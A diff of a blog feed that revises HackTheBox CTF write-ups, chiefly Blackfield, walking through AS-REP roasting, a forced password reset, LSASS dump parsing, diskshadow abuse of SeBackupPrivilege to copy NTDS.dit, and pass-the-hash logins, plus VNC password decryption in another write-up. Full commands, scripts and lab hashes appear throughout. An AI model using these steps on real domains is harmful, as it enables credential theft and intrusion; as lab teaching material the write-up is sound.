@@ -13,7 +13,7 @@
       
       <guid>https://fahmifj.github.io/writeups/hackthebox/htb-blackfield/</guid>
       <description>Abusing DiskShadow utility to dump Active Directory database</description>
-      <content:encoded><![CDATA[<p>Blackfield is a hard difficulty Windows machine  from HackTheBox that features Active Directory environment. It begins with collecting a list of usernames from an SMB share. With these usernames, I&rsquo;m able to perform AS-REP roasting attack and obtain a TGT from a helpdesk account. The helpdesk account can be used to reset the password of an audit account. Re-enumerating SMB shares using the audit account finds an LSASS memory dump file. The dump file contains an NT hash of a service account that is a member of Backup Operators. The privileges of the Backup Operators group can be abused to create a volume shadow copy and pull the <code>NTDS.dit</code> file from there. With the <code>NTDS.dit</code> file, I&rsquo;m able to retrieves the NT hash of the administrator account, and then perform pass-the-hash attack to gain administrator access.</p>
+      <content:encoded><![CDATA[<p>Blackfield begins with collecting a list of usernames from an SMB share. With these usernames, I&rsquo;m able to perform AS-REP roasting attack and obtain a TGT of a helpdesk account. The helpdesk account can be used to reset the password of an audit account. Re-enumerating SMB shares using the audit account finds a memory dump file of LSASS. The dump file contains an NT hash of a service account that is a member of Backup Operators. The privileges of the Backup Operators group can be abused to create a volume shadow copy and pull the <code>NTDS.dit</code> file from there. The <code>NTDS.dit</code> file can be extracted to retrieve the NT hash of the administrator account, and that hash can be used for remote access with administrative privilege.</p>
 <h4 id="skills-learned">Skills Learned</h4>
 <ul>
 <li>AS-REP roasting</li>
@@ -149,7 +149,7 @@ $ GetNPUsers.py BLACKFIELD.LOCAL/ -no-pass -usersfile users.list -dc-ip 10.10.10
 </code></pre></div><p>And I will watch the output file using <code>watch</code> command</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «blackfield» «10.10.14.169»
 $ watch -n <span class="m">1</span> cat TGT_AS-REP
-</code></pre></div><p>After a few minutes, it shows the hash for user <code>support</code>.</p>
+</code></pre></div><p>After a few minutes, it captures the hash for user <code>support</code>.</p>
 <p><div class="img-container"><img src="imgs/image-20210504160338371.png" alt="image-20210504160338371"  /></div>
 </p>
 <p>I&rsquo;ll send the hash to my Windows for cracking.</p>
@@ -230,17 +230,17 @@ INFO: Done in 00M 18S
 <p>I can upload these files to <code>BloodHound</code> GUI by drag and drop.</p>
 <p><div class="img-container"><img src="imgs/image-20210504165340110.png" alt="image-20210504165340110"  /></div>
 </p>
-<p>Enumerating the user <code>support</code> permissions discovers it has <code>ForceChangePassword</code> permission on Audit2020. That means user <code>support</code> is able to change the user <code>audit2020</code> password.</p>
+<p>Enumerating the user <strong>support</strong> permissions discovers it has <code>ForceChangePassword</code> permission on <strong>Audit2020</strong>. That means user <code>support</code> is able to change the user <code>audit2020</code> password.</p>
 <p><div class="img-container"><img src="imgs/image-20210504165510700.png" alt="image-20210504165510700"  /></div>
 </p>
 <h4 id="reset-audit2020-password">Reset Audit2020 Password</h4>
-<p>I can change the user <code>audit2020</code> password using <code>net rpc</code><sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup>. I&rsquo;ll set <code>P@$$w0rd!</code> as the new password for user <code>audit2020</code>.</p>
+<p>I can change the user <strong>audit2020</strong> password using <code>net rpc</code><sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup>. I&rsquo;ll set <code>P@$$w0rd!</code> as the new password for user <strong>audit2020</strong>.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «blackfield» «10.10.14.169»
 $ net rpc password audit2020 -U <span class="s1">&#39;support%#00^BlackKnight&#39;</span> -S 10.10.10.192
 Enter new password <span class="k">for</span> audit2020: 
 </code></pre></div><h3 id="access-as-audit2020">Access as Audit2020</h3>
 <h4 id="forensic-share">forensic share</h4>
-<p>With <code>audit2020</code>, I can access the forensic share.</p>
+<p>With <strong>audit2020</strong>, I can access the forensic share.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «blackfield» «10.10.14.169»
 $ smbmap -H 10.10.10.192 -u audit2020 -p <span class="s1">&#39;P@$$w0rd!&#39;</span> 
 <span class="o">[</span>+<span class="o">]</span> IP: 10.10.10.192:445        Name: BLACKFIELD.local
@@ -275,7 +275,7 @@ lsass.DMP: Mini DuMP crash report, <span class="m">16</span> streams, Sun Feb <s
 <h2 id="foothold">Foothold</h2>
 <h3 id="shell-as-svc_backup">Shell as svc_backup</h3>
 <h4 id="dump-lsass">Dump Lsass</h4>
-<p>A tool called <code>pypykatz</code> can be used to dump the contents of <code>lsass.DMP</code>. The NT hash of <code>svc-backup</code> immediately shows up on the top.</p>
+<p>A tool called <code>pypykatz</code> can be used to dump the contents of <code>lsass.DMP</code>. The NT hash of <strong>svc-backup</strong> immediately shows up on the top.</p>
 <p><div class="img-container"><img src="imgs/image-20210504173356195.png" alt="image-20210504173356195"  /></div>
 </p>
 <p>The hash is <code>9658d1d1dcd9250115e2205d9f48400d</code>.</p>
@@ -289,18 +289,17 @@ $ evil-winrm -i 10.10.10.192 -u svc_backup -H <span class="s1">&#39;9658d1d1dcd9
 <h2 id="privilege-escalation">Privilege Escalation</h2>
 <h3 id="shell-as-administrator">Shell as Administrator</h3>
 <h4 id="internal-enumeration">Internal Enumeration</h4>
-<p>Also from <a href="#ldap-domain-dump">LDAP</a>, <code>svc-backup</code> is a member of the Backup Operators group. Each member of the Backup Operators group can perform backup and restore operations. The privilege name to perform those two operations are called <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code>.</p>
+<p>Also from <a href="#ldap-domain-dump">LDAP</a>, <strong>svc-backup</strong> is a member of the Backup Operators group. Each member of the Backup Operators group can perform backup and restore operations. The privilege name to perform those two operations are called <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code>.</p>
 <p><div class="img-container"><img src="imgs/image-20210504174334134.png" alt="image-20210504174334134"  /></div>
 </p>
 <p>Those two privileges can be abused<sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup> using <code>diskshadow</code><sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref">4</a></sup>.</p>
-<p>I can&rsquo;t just perform the backup and restore if the system is currently in use. But, there is a technology from Microsoft called &ldquo;Shadow Copy&rdquo; that makes this possible, and that&rsquo;s where <code>diskshadow</code> will be used.</p>
-<p>So the idea is that I can create a volume shadow of <code>C:\</code> drive and backup the <code>NTDS.dit</code> file (AD database) from the volume shadow back to <code>C:\</code> drive. After that I can grab the <code>ntds.dit</code> and dump the NT hashes from <code>NTDS.dit</code> locally using <code>secretsdump.py</code>.</p>
+<p>I can&rsquo;t just perform the backup and restore if the system is currently in use (online). But, there is a technology from Microsoft called &ldquo;Shadow Copy&rdquo; that makes this possible, and that&rsquo;s where <code>diskshadow</code> will be used.</p>
+<p>So the idea is that I can create a volume shadow of <code>C:</code> drive and backup the <code>NTDS.dit</code> file (AD database) from the volume shadow back to <code>C:</code> drive. After that I can grab the <code>NTDS.dit</code> and dump the NT hashes from <code>NTDS.dit</code> locally using <code>secretsdump.py</code>. To achieve this I will use <a href="https://gist.githubusercontent.com/bohops/d34d9cf7793ba5f98009bc4ab2acd8f9/raw/38706044fb62790db16b0af21b7028a59591c05f/diskshadow.txt">this gist</a> as reference. I will also need <a href="https://github.com/giuliano108/SeBackupPrivilege">this module</a>.</p>
 <h4 id="abusing-sebackupprivilege">Abusing SeBackupPrivilege</h4>
-<p>To abuse this privilege, I&rsquo;ll use <a href="https://gist.githubusercontent.com/bohops/d34d9cf7793ba5f98009bc4ab2acd8f9/raw/38706044fb62790db16b0af21b7028a59591c05f/diskshadow.txt">this gist</a> as reference, and I&rsquo;ll need <a href="https://github.com/giuliano108/SeBackupPrivilege">this module</a>.</p>
-<p>Then, I&rsquo;ll create a few scripts to perform all the needed actions (create a volume, grab <code>ntds.dit</code>, and cleanup the volume shadow) in one shot.</p>
-<p>First, the script for grabbing <code>ntds.dit</code>, I&rsquo;ll save it as <code>copy.cmd</code></p>
+<p>I&rsquo;ll create a few scripts to perform all the needed actions (create a volume, grab <code>ntds.dit</code>, and cleanup the volume shadow) in one run.</p>
+<p>The first one is the script for grabbing <code>NTDS.dit</code> file, I will save it as <code>copy.cmd</code>.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">cmd.exe /c &#34;powershell.exe -c Import-Module(Resolve-Path(&#39;SeBackupPrivilegeCmdLets.dll&#39;)); Import-Module(Resolve-Path(&#39;SeBackupPrivilegeCmdLets.dll&#39;)); Copy-FileSeBackupPrivilege f:\windows\ntds\ntds.dit C:\temp\ntds.dit&#34;
-</code></pre></div><p>Second, the script for creating and deleting the volume shadow, I&rsquo;ll save it as <code>script.txt</code>.</p>
+</code></pre></div><p>The next one is the script for creating and deleting the volume shadow, I will save it as <code>script.txt</code>.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">set context persistent nowriters 
 add volume c: alias iamf 
 create 
@@ -308,7 +307,7 @@ expose %iamf% f:
 exec &#34;copy.cmd&#34; 
 delete shadows volume %iamf% 
 reset
-</code></pre></div><p>I&rsquo;ll move the modules and the scripts to a folder called <code>exploits</code>.</p>
+</code></pre></div><p>After that, I will move the modules and the scripts into a folder called <code>exploits</code>.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «exploits» «10.10.14.169»
 $ tree
 .
@@ -318,7 +317,7 @@ $ tree
 └── script.txt
 
 <span class="m">0</span> directories, <span class="m">4</span> files
-</code></pre></div><p>Now, I’ll copy these <code>.dll</code> modules, <code>copy.cmd</code>, and <code>script.txt</code> to Blackfield using upload feature from <code>evil-winrm</code> at <code>C:\temp\</code>.</p>
+</code></pre></div><p>Now, I’ll copy these <code>.dll</code> modules, <code>copy.cmd</code>, and <code>script.txt</code> to Blackfield using the upload feature from <code>evil-winrm</code> at <code>C:\temp\</code>.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «exploits» «10.10.14.169»
 $ evil-winrm -i 10.10.10.192 -u svc_backup -H <span class="s1">&#39;9658d1d1dcd9250115e2205d9f48400d&#39;</span>
 Evil-WinRM shell v2.3
@@ -335,7 +334,7 @@ Info: Establishing connection to remote endpoint
 ...&lt;SNIP&gt;...
 *Evil-WinRM* PS C:<span class="se">\t</span>emp&gt; upload script.txt
 ...&lt;SNIP&gt;...
-</code></pre></div><p>After that, I can run <code>diskshadow</code> with the <code>/s</code> option and specify <code>script.txt</code> as the command sequence.</p>
+</code></pre></div><p>After that, I can run <code>diskshadow</code> with the <code>/s</code> option, then I can supply the created <code>script.txt</code> as the command sequence.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">Evil-WinRM* PS C:<span class="se">\t</span>emp&gt; diskshadow /s script.txt
 Microsoft DiskShadow version 1.0
 Copyright <span class="o">(</span>C<span class="o">)</span> <span class="m">2013</span> Microsoft Corporation
@@ -378,7 +377,7 @@ Number of shadow copies deleted: <span class="m">1</span>
 </code></pre></div><p>Now that I have the <code>ntds.dit</code>, the last file that I need is the registry hive.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">Evil-WinRM* PS C:<span class="se">\t</span>emp&gt; reg save HKLM<span class="se">\S</span>YSTEM c:<span class="se">\t</span>emp<span class="se">\s</span>ystem
 The operation completed successfully.
-</code></pre></div><p>I&rsquo;ll download these files to my Kali using <code>evil-winrm</code> download feature.</p>
+</code></pre></div><p>I will download these files to my Kali using <code>evil-winrm</code> download feature.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">Evil-WinRM* PS C:<span class="se">\t</span>emp&gt; ls
 
 
@@ -409,9 +408,14 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b9
 <p>I can use the NT hash of administrator account to login using <code>evil-winrm</code> <em>pass-the-hash</em> feature.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «loot» «10.10.14.169»
 $ evil-winrm -i 10.10.10.192 -u administrator -H <span class="s1">&#39;184fb5e5178480be64824d4cd53b99ee&#39;</span>
-</code></pre></div><p><div class="img-container"><img src="imgs/image-20210504210042888.png" alt="image-20210504210042888"  /></div>
-</p>
-<section class="footnotes" role="doc-endnotes">
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; whoami
+blackfield<span class="se">\a</span>dministrator
+</code></pre></div><section class="footnotes" role="doc-endnotes">
 <hr>
 <ol>
 <li id="fn:1" role="doc-endnote">
@@ -754,15 +758,20 @@ $ tree
 <h3 id="shell-as-ssmith">Shell as s.smith</h3>
 <h4 id="decrypt-vnc-password">Decrypt VNC Password</h4>
 <p>The VNC password can be decrypted using metasploit irb (interactive ruby).</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt;&gt; <span class="nv">fixedkey</span> <span class="o">=</span> <span class="s2">&#34;\x17\x52\x6b\x06\x23\x4e\x58\x07&#34;</span>
-<span class="o">=</span>&gt; <span class="s2">&#34;\x17Rk\x06#NX\a&#34;</span>
-&gt;&gt; require <span class="s1">&#39;rex/proto/rfb&#39;</span>
-<span class="o">=</span>&gt; <span class="nb">true</span>
-&gt;&gt; Rex::Proto::RFB::Cipher.decrypt <span class="o">[</span><span class="s2">&#34;6BCF2A4B6E5ACA0f&#34;</span><span class="o">]</span>.pack<span class="o">(</span><span class="s1">&#39;H*&#39;</span><span class="o">)</span>, <span class="nv">fixedkey</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «Data» «192.168.43.234»
+$ msfconsole -q
+msf6 &gt; irb
+<span class="o">[</span>*<span class="o">]</span> Starting IRB shell...
+<span class="o">[</span>*<span class="o">]</span> You are in the <span class="s2">&#34;framework&#34;</span> object
+
+irb: warn: can<span class="s1">&#39;t alias jobs from irb_jobs.
+</span><span class="s1">&gt;&gt; fixedkey = &#34;\x17\x52\x6b\x06\x23\x4e\x58\x07&#34;
+</span><span class="s1">=&gt; &#34;\x17Rk\x06#NX\a&#34;
+</span><span class="s1">&gt;&gt; require &#39;</span>rex/proto/rfb<span class="s1">&#39;
+</span><span class="s1">=&gt; true
+</span><span class="s1">&gt;&gt; Rex::Proto::RFB::Cipher.decrypt [&#34;6BCF2A4B6E5ACA0f&#34;].pack(&#39;</span>H*<span class="err">&#39;</span><span class="o">)</span>, <span class="nv">fixedkey</span>
 <span class="o">=</span>&gt; <span class="s2">&#34;sT333ve2&#34;</span>
-</code></pre></div><p><div class="img-container"><img src="imgs/image-20210423213121911.png" alt="image-20210423213121911"  /></div>
-</p>
-<p>Since it was discovered in <code>s.smith</code>&rsquo;s folder, I may try this decrypted password on user <code>s.smith</code>.</p>
+</code></pre></div><p>Since it was discovered in <code>s.smith</code>&rsquo;s folder, I will try this decrypted password on user <code>s.smith</code>.</p>
 <h4 id="remote-access">Remote Access</h4>
 <p>From RPC enumeration, I already knew that user <code>s.smith</code> is a member of Remote Management Users, so I could try it with <code>evil-winrm</code> and it works.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «Data» «192.168.43.234»
@@ -864,8 +873,7 @@ $ <span class="nb">echo</span> <span class="s1">&#39;BQO5l5Kj9MdErXx6Q6AGOw==&#3
 				<span class="n">sqliteConnection</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span>
 			<span class="p">}</span>
 <span class="p">...&lt;</span><span class="n">snip</span><span class="p">&gt;...</span>
-</code></pre></div><p>Let&rsquo;s break it down.</p>
-<p>In order for the program to run properly, I need to specify the database path as its first argument.</p>
+</code></pre></div><p>In order for the program to run properly, I need to specify the database path as its first argument.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="p">...&lt;</span><span class="n">snip</span><span class="p">&gt;...</span>
 <span class="k">if</span> <span class="p">(</span><span class="n">MyProject</span><span class="p">.</span><span class="n">Application</span><span class="p">.</span><span class="n">CommandLineArgs</span><span class="p">.</span><span class="n">Count</span> <span class="p">!=</span> <span class="m">1</span><span class="p">)</span>
 	<span class="p">{</span>
@@ -873,7 +881,7 @@ $ <span class="nb">echo</span> <span class="s1">&#39;BQO5l5Kj9MdErXx6Q6AGOw==&#3
 		<span class="k">return</span><span class="p">;</span>
 	<span class="p">}</span>
 <span class="p">...&lt;</span><span class="n">snip</span><span class="p">&gt;...</span>
-</code></pre></div><p>If the condition above is satisfied, it opens an SQL connection and fetches all data from the <code>Ldap</code> table. Each of them is then stored to <code>str</code>, <code>str2</code>, and <code>password</code>.</p>
+</code></pre></div><p>If the condition above is satisfied, it opens an SQL connection and fetches all data from the <code>Ldap</code> table. Each of them is then stored into <code>str</code>, <code>str2</code>, and <code>password</code>.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="p">...&lt;</span><span class="n">snip</span><span class="p">&gt;...</span>
 				<span class="n">sqliteConnection</span><span class="p">.</span><span class="n">Open</span><span class="p">();</span>
 				<span class="k">using</span> <span class="p">(</span><span class="n">SQLiteCommand</span> <span class="n">sqliteCommand</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SQLiteCommand</span><span class="p">(</span><span class="s">&#34;SELECT * FROM LDAP&#34;</span><span class="p">,</span> <span class="n">sqliteConnection</span><span class="p">))</span>
